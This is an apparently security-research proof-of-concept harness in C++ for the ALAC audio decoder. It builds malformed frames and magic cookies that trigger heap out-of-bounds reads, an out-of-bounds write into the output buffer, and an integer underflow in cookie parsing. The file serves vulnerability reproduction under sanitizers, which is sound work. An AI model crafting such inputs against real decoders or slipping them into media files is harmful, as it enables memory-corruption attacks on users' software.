// ALAC decoder proof-of-concept harness - ASan/UBSan build
// Exercises: T1 partial-frame numSamples overflow (escape path)
//            T2 truncated frame OOB read
//            T3 undersized magic cookie OOB read in Init
//            T4 extra SCE elements -> output buffer OOB write
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "ALACDecoder.h"
#include "ALACBitUtilities.h"

static ALACSpecificConfig g_cookie;
static uint8_t cookie_buf[32];

static void make_cookie(uint32_t frameLength, uint8_t bitDepth, uint8_t numChannels)
{
    memset(&g_cookie, 0, sizeof(g_cookie));
    g_cookie.frameLength = frameLength;
    g_cookie.compatibleVersion = 0;
    g_cookie.bitDepth = bitDepth;
    g_cookie.pb = 40;
    g_cookie.mb = 10;
    g_cookie.kb = 14;
    g_cookie.numChannels = numChannels;
    g_cookie.maxRun = 255;
    g_cookie.maxFrameBytes = 8192;
    g_cookie.avgBitRate = 0;
    g_cookie.sampleRate = 44100;
    memcpy(cookie_buf, &g_cookie, sizeof(g_cookie));
}

// bit writer: MSB-first, matching BitBufferRead's big-endian bit order
static uint8_t *fbuf; // heap frame buffer
static uint32_t fbuflen = 0;
static uint32_t fbitpos = 0;
static void putbits(uint32_t val, int n)
{
    for (int i = n - 1; i >= 0; i--)
    {
        if (val & (1u << i))
            fbuf[fbitpos >> 3] |= (uint8_t)(1u << (7 - (fbitpos & 7)));
        fbitpos++;
    }
}

// T1: SCE escape frame, partialFrame=1, numSamples=0x10000 (>> frameLength 4096)
static void build_T1_frame(void)
{
    fbuflen = 131200; // enough for 65536 16-bit samples + header
    fbuf = (uint8_t *)malloc(fbuflen);
    memset(fbuf, 0, fbuflen);
    fbitpos = 0;
    putbits(0, 3);                 // ID_SCE
    putbits(0, 4);                 // elementInstanceTag
    putbits(0, 12);                // unusedHeader
    putbits(0b1001, 4);            // partialFrame=1, bytesShifted=0, escapeFlag=1
    putbits(0x00010000u, 32);      // numSamples = 65536
    // escape path: 16-bit samples follow immediately, nothing else to set up
    for (uint32_t i = 0; i < 0x10000u; i++)
        putbits(0x0000, 16);       // 16-bit sample data
}

// T4: three SCE escape frames, each numSamples=100, decode with numChannels=1
static void build_T4_frame(void)
{
    fbuflen = 4096;
    fbuf = (uint8_t *)malloc(fbuflen);
    memset(fbuf, 0, fbuflen);
    fbitpos = 0;
    for (int e = 0; e < 3; e++)
    {
        putbits(0, 3);             // ID_SCE
        putbits(e, 4);             // elementInstanceTag
        putbits(0, 12);            // unusedHeader
        putbits(0b1001, 4);        // partialFrame=1, escapeFlag=1
        putbits(100, 32);          // numSamples = 100
        for (int i = 0; i < 100; i++)
            putbits(0x1234, 16);   // 16-bit sample
    }
}

int main(int argc, char **argv)
{
    int which = atoi(argv[1]);
    int32_t status;
    uint32_t outNum = 0;

    if (which == 1)
    {
        // T1: numSamples overflow of internal frameLength-sized buffers
        make_cookie(4096, 16, 2);
        ALACDecoder dec;
        status = dec.Init(cookie_buf, sizeof(g_cookie));
        printf("T1 Init status=%d\n", status);
        build_T1_frame();
        BitBuffer bits;
        BitBufferInit(&bits, fbuf, (fbitpos + 7) / 8);
        int16_t *out = (int16_t *)calloc(4096 * 2, sizeof(int16_t)); // "caller" output buffer
        status = dec.Decode(&bits, (uint8_t *)out, 4096, 2, &outNum);
        printf("T1 Decode status=%d outNum=%u\n", status, outNum);
    }
    else if (which == 2)
    {
        // T2: 1-byte frame -> BitBufferReadSmall/BitBufferRead OOB read
        make_cookie(4096, 16, 2);
        ALACDecoder dec;
        status = dec.Init(cookie_buf, sizeof(g_cookie));
        uint8_t *tiny = (uint8_t *)malloc(1);
        tiny[0] = 0x00; // tag=SCE... reads cur[0],cur[1],cur[2] on a 1-byte buffer
        BitBuffer bits;
        BitBufferInit(&bits, tiny, 1);
        int16_t *out = (int16_t *)calloc(4096 * 2, sizeof(int16_t));
        status = dec.Decode(&bits, (uint8_t *)out, 4096, 2, &outNum);
        printf("T2 Decode status=%d\n", status);
    }
    else if (which == 3)
    {
        // T3: 4-byte magic cookie -> Init reads cookie[4..7] OOB
        ALACDecoder dec;
        uint8_t *cookie = (uint8_t *)malloc(4);
        memcpy(cookie, "abcd", 4);
        status = dec.Init(cookie, 4);
        printf("T3 Init status=%d\n", status);
    }
    else if (which == 4)
    {
        // T4: 3 SCE elements decoded as 1 channel -> output OOB write
        make_cookie(4096, 16, 1);
        ALACDecoder dec;
        status = dec.Init(cookie_buf, sizeof(g_cookie));
        build_T4_frame();
        BitBuffer bits;
        BitBufferInit(&bits, fbuf, (fbitpos + 7) / 8);
        int16_t *out = (int16_t *)calloc(1 * 100, sizeof(int16_t)); // numChannels*numSamples
        status = dec.Decode(&bits, (uint8_t *)out, 100, 1, &outNum);
        printf("T4 Decode status=%d outNum=%u\n", status, outNum);
    }
    else if (which == 5)
    {
        // T5: truncated compressed frame -> ag_dec read32bit/getstreambits OOB read past frame end
        make_cookie(4096, 16, 2);
        ALACDecoder dec;
        status = dec.Init(cookie_buf, sizeof(g_cookie));
        uint8_t *frame = (uint8_t *)calloc(1, 8); // 55-bit header + 1 slack byte, NO golomb data
        fbuf = frame; fbuflen = 8;
        fbitpos = 0;
        putbits(0, 3);                 // ID_SCE
        putbits(0, 4);                 // elementInstanceTag
        putbits(0, 12);                // unusedHeader
        putbits(0b0000, 4);            // partialFrame=0, bytesShifted=0, escapeFlag=0
        putbits(0, 8);                 // mixBits
        putbits(0, 8);                 // mixRes
        putbits(0, 8);                 // modeU=0, denShiftU=0
        putbits(0, 8);                 // pbFactorU=0, numU=0
        BitBuffer bits;
        BitBufferInit(&bits, fbuf, fbuflen);
        int16_t *out = (int16_t *)calloc(4096 * 2, sizeof(int16_t));
        status = dec.Decode(&bits, (uint8_t *)out, 4096, 2, &outNum);
        printf("T5 Decode status=%d\n", status);
    }
    else if (which == 6)
    {
        // T6: 20-byte cookie with 'frma' at [4..7] and 'alac' at [16..19] -> both prefix skips
        //     applied, theCookieBytesRemaining underflows (20-12-12 wraps uint32), then the
        //     24-byte ALACSpecificConfig is read from cookie+24 -> 24-byte heap OOB read
        ALACDecoder dec;
        uint8_t *cookie = (uint8_t *)malloc(20);
        memcpy(cookie, "xxxxfrma", 8);
        memset(cookie + 8, 'x', 8);
        memcpy(cookie + 16, "alac", 4);
        status = dec.Init(cookie, 20);
        printf("T6 Init status=%d\n", status);
    }
    return 0;
}
